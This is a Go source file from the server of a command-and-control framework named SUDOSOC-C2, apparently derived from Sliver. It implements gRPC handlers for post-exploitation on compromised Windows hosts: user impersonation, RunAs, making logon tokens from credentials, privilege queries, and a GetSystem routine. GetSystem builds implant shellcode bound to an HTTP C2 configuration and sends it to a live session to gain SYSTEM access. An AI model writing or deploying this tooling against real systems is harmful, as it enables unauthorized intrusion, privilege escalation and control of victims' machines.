package rpc

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2019  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"os"

	"github.com/sudosoc/SUDOSOC-C2/protobuf/clientpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/commonpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
	"github.com/sudosoc/SUDOSOC-C2/server/codenames"
	"github.com/sudosoc/SUDOSOC-C2/server/core"
	"github.com/sudosoc/SUDOSOC-C2/server/db"
	"github.com/sudosoc/SUDOSOC-C2/server/generate"
	"github.com/sudosoc/SUDOSOC-C2/util"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
	"google.golang.org/protobuf/proto"
)

// Impersonate - Impersonate a remote user
func (rpc *Server) Impersonate(ctx context.Context, req *sudosocpb.ImpersonateReq) (*sudosocpb.Impersonate, error) {
	resp := &sudosocpb.Impersonate{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RunAs - Run a remote process as a specific user
func (rpc *Server) RunAs(ctx context.Context, req *sudosocpb.RunAsReq) (*sudosocpb.RunAs, error) {
	resp := &sudosocpb.RunAs{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RevToSelf - Revert process context to self
func (rpc *Server) RevToSelf(ctx context.Context, req *sudosocpb.RevToSelfReq) (*sudosocpb.RevToSelf, error) {
	resp := &sudosocpb.RevToSelf{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// CurrentTokenOwner - Retrieve the thread token's owner
func (rpc *Server) CurrentTokenOwner(ctx context.Context, req *sudosocpb.CurrentTokenOwnerReq) (*sudosocpb.CurrentTokenOwner, error) {
	resp := &sudosocpb.CurrentTokenOwner{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
func (rpc *Server) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*sudosocpb.GetSystem, error) {
	var (
		shellcode []byte
		name      string
	)

	if req == nil || req.Request == nil {
		return nil, ErrMissingRequestField
	}

	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	// retrieve http c2 implant config
	httpC2Config, err := db.LoadHTTPC2ConfigByName(req.Config.HTTPC2ConfigName)
	if err != nil {
		return nil, rpcError(err)
	}

	if req.Name == "" {
		name, err = codenames.GetCodename()
		if err != nil {
			return nil, rpcError(err)
		}
	} else if err := util.AllowedName(name); err != nil {
		return nil, status.Error(codes.InvalidArgument, err.Error())
	} else {
		name = req.Name
	}

	shellcode, _, err = getSliverShellcode(name)
	if err != nil {
		req.Config.Format = clientpb.OutputFormat_SHELLCODE
		req.Config.ObfuscateSymbols = false
		req.Config.IsShellcode = true
		req.Config.IsSharedLib = false
		req.Config.TemplateName = "phantom"
		if len(req.Config.Exports) == 0 {
			req.Config.Exports = []string{"StartW"}
		}
		build, err := generate.GenerateConfig(name, req.Config)
		if err != nil {
			return nil, rpcError(err)
		}
		shellcodePath, err := generate.SliverShellcode(name, build, req.Config, httpC2Config.ImplantConfig)
		if err != nil {
			return nil, rpcError(err)
		}
		shellcode, _ = os.ReadFile(shellcodePath)
	}
	data, err := proto.Marshal(&sudosocpb.InvokeGetSystemReq{
		Data:           shellcode,
		HostingProcess: req.HostingProcess,
		Request:        req.GetRequest(),
	})
	if err != nil {
		return nil, rpcError(err)
	}

	timeout := rpc.getTimeout(req)
	data, err = session.Request(sudosocpb.MsgInvokeGetSystemReq, timeout, data)
	if err != nil {
		return nil, rpcError(err)
	}
	getSystem := &sudosocpb.GetSystem{}
	err = proto.Unmarshal(data, getSystem)
	if err != nil {
		return nil, rpcError(err)
	}
	return getSystem, nil
}

// MakeToken - Creates a new logon session to impersonate a user based on its credentials.
func (rpc *Server) MakeToken(ctx context.Context, req *sudosocpb.MakeTokenReq) (*sudosocpb.MakeToken, error) {
	resp := &sudosocpb.MakeToken{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// GetPrivs - gRPC interface to get privilege information from the current process
func (rpc *Server) GetPrivs(ctx context.Context, req *sudosocpb.GetPrivsReq) (*sudosocpb.GetPrivs, error) {
	if req == nil || req.Request == nil {
		return nil, ErrMissingRequestField
	}

	sessionID := req.Request.SessionID

	resp := &sudosocpb.GetPrivs{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}

	/*
		Update integrity information for a session
		beacons will have to be updated by the client after the information is received from the implant
	*/
	if !req.Request.Async {
		session := core.Sessions.Get(sessionID)
		if session == nil {
			return nil, ErrInvalidSessionID
		}
		session.Integrity = resp.ProcessIntegrity
		core.Sessions.UpdateSession(session)
	}

	return resp, nil
}
